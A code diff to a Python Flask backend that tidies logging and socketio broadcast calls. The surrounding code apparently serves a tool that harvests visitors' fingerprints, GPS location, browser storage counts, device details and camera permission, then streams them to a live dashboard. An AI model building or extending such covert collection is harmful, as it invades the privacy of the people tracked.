@@ -685,9 +685,9 @@ def collect_data():
         # Enhanced debug: Log full payload details (only in development)
         if not Config.IS_PRODUCTION:
             logger.info("=" * 80)
-            logger.info(f"[DEBUG] Received data at {timestamp}")
-            logger.info(f"[DEBUG] Payload keys: {list(data.keys()) if data else 'None'}")
-            logger.info(f"[DEBUG] Full payload structure:")
+            logger.debug(f"[DEBUG] Received data at {timestamp}")
+            logger.debug(f"[DEBUG] Payload keys: {list(data.keys()) if data else 'None'}")
+            logger.debug(f"[DEBUG] Full payload structure:")
             
             # Log each top-level field
             for key in data.keys():
@@ -920,109 +920,110 @@ def collect_data():
         user_agent = request.headers.get('User-Agent', '')
         raw_data = json.dumps(data)
 
-        # Enhanced logging for all collected data
-        logger.info("=" * 80)
-        logger.info(f"[DEBUG] Processing entry at {timestamp}")
-        logger.info(f"[DEBUG] IP Address: {ip_address}")
-        logger.info(f"[DEBUG] Fingerprint: {fingerprint[:32]}...")
-        logger.info(f"[DEBUG] User Agent: {user_agent[:100]}...")
-        
-        # Log device info summary
-        device_info_parsed = json.loads(device_info) if device_info else {}
-        logger.info(f"[DEBUG] Device Info Summary:")
-        logger.info(f"  - Browser: {device_info_parsed.get('browser', 'NOT SET')}")
-        logger.info(f"  - OS: {device_info_parsed.get('os', 'NOT SET')} {device_info_parsed.get('osVersion', '')}")
-        logger.info(f"  - Device Type: {device_info_parsed.get('deviceType', 'NOT SET')}")
-        logger.info(f"  - Device Model: {device_info_parsed.get('deviceModel', 'NOT SET')}")
-        logger.info(f"  - Screen: {device_info_parsed.get('screen', {}).get('width', '?')}x{device_info_parsed.get('screen', {}).get('height', '?')}")
-        
-        # Log location data summary
-        location_data_parsed = json.loads(location_data) if location_data else {}
-        logger.info(f"[DEBUG] Location Data Summary:")
-        logger.info(f"  - IP: {location_data_parsed.get('ip', 'NOT SET')}")
-        logger.info(f"  - Location Type: {location_data_parsed.get('location_type', 'NOT SET')}")
-        logger.info(f"  - City: {location_data_parsed.get('city', 'NOT SET')}")
-        logger.info(f"  - Region: {location_data_parsed.get('region', 'NOT SET')}")
-        logger.info(f"  - Country: {location_data_parsed.get('country', 'NOT SET')}")
-        logger.info(f"  - Coordinates: {location_data_parsed.get('latitude', '?')}, {location_data_parsed.get('longitude', '?')}")
-        if location_data_parsed.get('gps'):
-            logger.info(f"  - GPS Accuracy: {location_data_parsed.get('gps', {}).get('accuracy', 'NOT SET')}m")
-        
-        # Log storage info summary
-        storage_info_parsed = json.loads(storage_info) if storage_info else {}
-        logger.info(f"[DEBUG] Storage Info Summary:")
-        logger.info(f"  - Cookies: {len(storage_info_parsed.get('cookies', []))} items")
-        logger.info(f"  - LocalStorage: {storage_info_parsed.get('localStorage', {}).get('count', 0)} items")
-        logger.info(f"  - SessionStorage: {storage_info_parsed.get('sessionStorage', {}).get('count', 0)} items")
-        logger.info(f"  - IndexedDB: {storage_info_parsed.get('indexedDB', {}).get('count', 'unknown')} databases")
-        
-        # Log connection info
-        connection_info_parsed = json.loads(connection_info) if connection_info else {}
-        logger.info(f"[DEBUG] Connection Info:")
-        if connection_info_parsed.get('tls'):
-            logger.info(f"  - Protocol: {connection_info_parsed.get('tls', {}).get('protocol', 'NOT SET')}")
-            logger.info(f"  - Secure: {connection_info_parsed.get('tls', {}).get('isSecure', 'NOT SET')}")
-        
-        # Log VPN detection
-        vpn_detection_parsed = json.loads(vpn_detection) if vpn_detection else {}
-        logger.info(f"[DEBUG] VPN Detection:")
-        logger.info(f"  - Is VPN: {vpn_detection_parsed.get('isVPN', 'NOT SET')}")
-        logger.info(f"  - Score: {vpn_detection_parsed.get('score', 'NOT SET')}")
-        logger.info(f"  - Reasons: {vpn_detection_parsed.get('reasons', [])}")
-        
-        # Log battery info
-        battery_info_parsed = json.loads(battery_info) if battery_info else {}
-        logger.info(f"[DEBUG] Battery Info:")
-        if battery_info_parsed.get('supported'):
-            logger.info(f"  - Supported: Yes")
-            logger.info(f"  - Level: {battery_info_parsed.get('level', 'NOT SET')}")
-            logger.info(f"  - Charging: {battery_info_parsed.get('charging', 'NOT SET')}")
-            logger.info(f"  - Health: {battery_info_parsed.get('health', 'NOT SET')}")
-        else:
-            logger.info(f"  - Supported: No")
-        
-        # Log network info
-        network_info_parsed = json.loads(network_info) if network_info else {}
-        logger.info(f"[DEBUG] Network Info:")
-        if network_info_parsed.get('supported'):
-            logger.info(f"  - Supported: Yes")
-            logger.info(f"  - Type: {network_info_parsed.get('type', 'NOT SET')}")
-            logger.info(f"  - Effective Type: {network_info_parsed.get('effectiveType', 'NOT SET')}")
-            logger.info(f"  - Downlink: {network_info_parsed.get('downlink', 'NOT SET')} Mbps")
-            logger.info(f"  - RTT: {network_info_parsed.get('rtt', 'NOT SET')} ms")
-        else:
-            logger.info(f"  - Supported: No")
-        
-        # Log media devices
-        media_devices_parsed = json.loads(media_devices) if media_devices else {}
-        logger.info(f"[DEBUG] Media Devices:")
-        if media_devices_parsed.get('supported'):
-            logger.info(f"  - Supported: Yes")
-            logger.info(f"  - Audio Inputs: {media_devices_parsed.get('audioInputs', 0)}")
-            logger.info(f"  - Audio Outputs: {media_devices_parsed.get('audioOutputs', 0)}")
-            logger.info(f"  - Video Inputs: {media_devices_parsed.get('videoInputs', 0)}")
-            logger.info(f"  - Total: {media_devices_parsed.get('total', 0)}")
-        else:
-            logger.info(f"  - Supported: No")
-        
-        # Log camera permission
-        camera_data = camera_access
-        logger.info(f"[DEBUG] Camera Permission:")
-        logger.info(f"  - Granted: {camera_data.get('granted', 'NOT SET')}")
-        logger.info(f"  - Message: {camera_data.get('message', 'NO MESSAGE')}")
-        if camera_data.get('error'):
-            logger.warning(f"  - Error: {camera_data.get('error')}")
-        
-        logger.info("=" * 80)
-        
-        # Log full raw payload (truncated for readability)
-        logger.info(f"[DEBUG] Full Raw Payload (first 2000 chars):")
-        raw_payload_str = json.dumps(data, indent=2)
-        if len(raw_payload_str) > 2000:
-            logger.info(raw_payload_str[:2000] + "... [truncated]")
-        else:
-            logger.info(raw_payload_str)
-        logger.info("=" * 80)
+        # Enhanced logging for all collected data (only in development to avoid performance impact)
+        if not Config.IS_PRODUCTION:
+            logger.debug("=" * 80)
+            logger.debug(f"[DEBUG] Processing entry at {timestamp}")
+            logger.debug(f"[DEBUG] IP Address: {ip_address}")
+            logger.debug(f"[DEBUG] Fingerprint: {fingerprint[:32]}...")
+            logger.debug(f"[DEBUG] User Agent: {user_agent[:100]}...")
+            
+            # Log device info summary
+            device_info_parsed = json.loads(device_info) if device_info else {}
+            logger.debug(f"[DEBUG] Device Info Summary:")
+            logger.debug(f"  - Browser: {device_info_parsed.get('browser', 'NOT SET')}")
+            logger.debug(f"  - OS: {device_info_parsed.get('os', 'NOT SET')} {device_info_parsed.get('osVersion', '')}")
+            logger.debug(f"  - Device Type: {device_info_parsed.get('deviceType', 'NOT SET')}")
+            logger.debug(f"  - Device Model: {device_info_parsed.get('deviceModel', 'NOT SET')}")
+            logger.debug(f"  - Screen: {device_info_parsed.get('screen', {}).get('width', '?')}x{device_info_parsed.get('screen', {}).get('height', '?')}")
+            
+            # Log location data summary
+            location_data_parsed = json.loads(location_data) if location_data else {}
+            logger.debug(f"[DEBUG] Location Data Summary:")
+            logger.debug(f"  - IP: {location_data_parsed.get('ip', 'NOT SET')}")
+            logger.debug(f"  - Location Type: {location_data_parsed.get('location_type', 'NOT SET')}")
+            logger.debug(f"  - City: {location_data_parsed.get('city', 'NOT SET')}")
+            logger.debug(f"  - Region: {location_data_parsed.get('region', 'NOT SET')}")
+            logger.debug(f"  - Country: {location_data_parsed.get('country', 'NOT SET')}")
+            logger.debug(f"  - Coordinates: {location_data_parsed.get('latitude', '?')}, {location_data_parsed.get('longitude', '?')}")
+            if location_data_parsed.get('gps'):
+                logger.debug(f"  - GPS Accuracy: {location_data_parsed.get('gps', {}).get('accuracy', 'NOT SET')}m")
+            
+            # Log storage info summary
+            storage_info_parsed = json.loads(storage_info) if storage_info else {}
+            logger.debug(f"[DEBUG] Storage Info Summary:")
+            logger.debug(f"  - Cookies: {len(storage_info_parsed.get('cookies', []))} items")
+            logger.debug(f"  - LocalStorage: {storage_info_parsed.get('localStorage', {}).get('count', 0)} items")
+            logger.debug(f"  - SessionStorage: {storage_info_parsed.get('sessionStorage', {}).get('count', 0)} items")
+            logger.debug(f"  - IndexedDB: {storage_info_parsed.get('indexedDB', {}).get('count', 'unknown')} databases")
+            
+            # Log connection info
+            connection_info_parsed = json.loads(connection_info) if connection_info else {}
+            logger.debug(f"[DEBUG] Connection Info:")
+            if connection_info_parsed.get('tls'):
+                logger.debug(f"  - Protocol: {connection_info_parsed.get('tls', {}).get('protocol', 'NOT SET')}")
+                logger.debug(f"  - Secure: {connection_info_parsed.get('tls', {}).get('isSecure', 'NOT SET')}")
+            
+            # Log VPN detection
+            vpn_detection_parsed = json.loads(vpn_detection) if vpn_detection else {}
+            logger.debug(f"[DEBUG] VPN Detection:")
+            logger.debug(f"  - Is VPN: {vpn_detection_parsed.get('isVPN', 'NOT SET')}")
+            logger.debug(f"  - Score: {vpn_detection_parsed.get('score', 'NOT SET')}")
+            logger.debug(f"  - Reasons: {vpn_detection_parsed.get('reasons', [])}")
+            
+            # Log battery info
+            battery_info_parsed = json.loads(battery_info) if battery_info else {}
+            logger.debug(f"[DEBUG] Battery Info:")
+            if battery_info_parsed.get('supported'):
+                logger.debug(f"  - Supported: Yes")
+                logger.debug(f"  - Level: {battery_info_parsed.get('level', 'NOT SET')}")
+                logger.debug(f"  - Charging: {battery_info_parsed.get('charging', 'NOT SET')}")
+                logger.debug(f"  - Health: {battery_info_parsed.get('health', 'NOT SET')}")
+            else:
+                logger.debug(f"  - Supported: No")
+            
+            # Log network info
+            network_info_parsed = json.loads(network_info) if network_info else {}
+            logger.debug(f"[DEBUG] Network Info:")
+            if network_info_parsed.get('supported'):
+                logger.debug(f"  - Supported: Yes")
+                logger.debug(f"  - Type: {network_info_parsed.get('type', 'NOT SET')}")
+                logger.debug(f"  - Effective Type: {network_info_parsed.get('effectiveType', 'NOT SET')}")
+                logger.debug(f"  - Downlink: {network_info_parsed.get('downlink', 'NOT SET')} Mbps")
+                logger.debug(f"  - RTT: {network_info_parsed.get('rtt', 'NOT SET')} ms")
+            else:
+                logger.debug(f"  - Supported: No")
+            
+            # Log media devices
+            media_devices_parsed = json.loads(media_devices) if media_devices else {}
+            logger.debug(f"[DEBUG] Media Devices:")
+            if media_devices_parsed.get('supported'):
+                logger.debug(f"  - Supported: Yes")
+                logger.debug(f"  - Audio Inputs: {media_devices_parsed.get('audioInputs', 0)}")
+                logger.debug(f"  - Audio Outputs: {media_devices_parsed.get('audioOutputs', 0)}")
+                logger.debug(f"  - Video Inputs: {media_devices_parsed.get('videoInputs', 0)}")
+                logger.debug(f"  - Total: {media_devices_parsed.get('total', 0)}")
+            else:
+                logger.debug(f"  - Supported: No")
+            
+            # Log camera permission
+            camera_data = camera_access
+            logger.debug(f"[DEBUG] Camera Permission:")
+            logger.debug(f"  - Granted: {camera_data.get('granted', 'NOT SET')}")
+            logger.debug(f"  - Message: {camera_data.get('message', 'NO MESSAGE')}")
+            if camera_data.get('error'):
+                logger.debug(f"  - Error: {camera_data.get('error')}")
+            
+            logger.debug("=" * 80)
+            
+            # Log full raw payload (truncated for readability)
+            logger.debug(f"[DEBUG] Full Raw Payload (first 2000 chars):")
+            raw_payload_str = json.dumps(data, indent=2)
+            if len(raw_payload_str) > 2000:
+                logger.debug(raw_payload_str[:2000] + "... [truncated]")
+            else:
+                logger.debug(raw_payload_str)
+            logger.debug("=" * 80)
 
         # Store in database
         try:
@@ -1085,23 +1086,24 @@ def collect_data():
                     background_thread.start()
                     logger.info(f"Started background thread for reverse geocoding of entry #{entry_id}")
                 
-                # Log what was stored in database
-                logger.info("=" * 80)
-                logger.info(f"[DEBUG] Database Storage Summary for Entry #{entry_id}:")
-                logger.info(f"  - Timestamp: {timestamp}")
-                logger.info(f"  - IP Address: {ip_address}")
-                logger.info(f"  - Fingerprint: {fingerprint[:32]}...")
-                logger.info(f"  - Device Info: {'Stored' if device_info else 'NOT STORED'}")
-                logger.info(f"  - Location Data: {'Stored' if location_data else 'NOT STORED'}")
-                logger.info(f"  - Storage Info: {'Stored' if storage_info else 'NOT STORED'}")
-                logger.info(f"  - Connection Info: {'Stored' if connection_info else 'NOT STORED'}")
-                logger.info(f"  - VPN Detection: {'Stored' if vpn_detection else 'NOT STORED'}")
-                logger.info(f"  - Battery Info: {'Stored' if battery_info else 'NOT STORED'}")
-                logger.info(f"  - Network Info: {'Stored' if network_info else 'NOT STORED'}")
-                logger.info(f"  - Media Devices: {'Stored' if media_devices else 'NOT STORED'}")
-                logger.info(f"  - Camera Permission: {'Stored' if camera_permission else 'NOT STORED'}")
-                logger.info(f"  - Raw Data: {'Stored' if raw_data else 'NOT STORED'}")
-                logger.info("=" * 80)
+                # Log what was stored in database (only in development)
+                if not Config.IS_PRODUCTION:
+                    logger.debug("=" * 80)
+                    logger.debug(f"[DEBUG] Database Storage Summary for Entry #{entry_id}:")
+                    logger.debug(f"  - Timestamp: {timestamp}")
+                    logger.debug(f"  - IP Address: {ip_address}")
+                    logger.debug(f"  - Fingerprint: {fingerprint[:32]}...")
+                    logger.debug(f"  - Device Info: {'Stored' if device_info else 'NOT STORED'}")
+                    logger.debug(f"  - Location Data: {'Stored' if location_data else 'NOT STORED'}")
+                    logger.debug(f"  - Storage Info: {'Stored' if storage_info else 'NOT STORED'}")
+                    logger.debug(f"  - Connection Info: {'Stored' if connection_info else 'NOT STORED'}")
+                    logger.debug(f"  - VPN Detection: {'Stored' if vpn_detection else 'NOT STORED'}")
+                    logger.debug(f"  - Battery Info: {'Stored' if battery_info else 'NOT STORED'}")
+                    logger.debug(f"  - Network Info: {'Stored' if network_info else 'NOT STORED'}")
+                    logger.debug(f"  - Media Devices: {'Stored' if media_devices else 'NOT STORED'}")
+                    logger.debug(f"  - Camera Permission: {'Stored' if camera_permission else 'NOT STORED'}")
+                    logger.debug(f"  - Raw Data: {'Stored' if raw_data else 'NOT STORED'}")
+                    logger.debug("=" * 80)
         except sqlite3.Error as e:
             logger.error(f"Database error in collect_data: {e}", exc_info=True)
             return jsonify({'status': 'error', 'message': 'Database error'}), 500
@@ -1183,8 +1185,8 @@ def collect_data():
                         }
                         
                         # Send as new_entry so dashboard can add/update it
-                        # Note: Removed include_self=False - not available in HTTP request context
-                        socketio.emit('new_entry', entry_data, broadcast=True, namespace='/')
+                        # Note: socketio.emit() broadcasts when to/room parameters are omitted
+                        socketio.emit('new_entry', entry_data, namespace='/')
                         logger.debug(f"Broadcasted entry update (as new_entry) for entry #{entry_id}")
                     except Exception as e:
                         logger.error(f"Error preparing updated entry data: {e}", exc_info=True)
@@ -1195,7 +1197,7 @@ def collect_data():
                             'ip_address': ip_address,
                             'fingerprint': fingerprint,
                             'updated': True
-                        }, broadcast=True, include_self=False, namespace='/')
+                        }, namespace='/')
                         logger.debug(f"Broadcasted simple entry update for entry #{entry_id}")
             else:
                 # New entry created - broadcast new entry event
@@ -1273,8 +1275,8 @@ def collect_data():
                             'is_online': is_online
                         }
                         
-                        # Note: Removed include_self=False - not available in HTTP request context
-                        socketio.emit('new_entry', entry_data, broadcast=True, namespace='/')
+                        # Note: socketio.emit() broadcasts when to/room parameters are omitted
+                        socketio.emit('new_entry', entry_data, namespace='/')
                         logger.debug(f"Broadcasted new entry #{entry_id} to dashboard")
                         logger.debug(f"Entry data keys: {list(entry_data.keys())}")
                         logger.debug(f"Entry ID: {entry_data.get('id')}, IP: {entry_data.get('ip_address')}")
@@ -2298,11 +2300,11 @@ def cleanup_offline_users():
                             del active_streams[entry_id]
                         
                         # Broadcast offline status
-                        # Note: Removed include_self=False - not available in background thread context
+                        # Note: socketio.emit() broadcasts when to/room parameters are omitted
                         socketio.emit('user_status_update', {
                             'entry_id': entry_id,
                             'is_online': False
-                        }, broadcast=True, namespace='/')
+                        }, namespace='/')
                 except Exception as e:
                     logger.warning(f"Error checking ping time for entry {entry_id}: {e}")
 
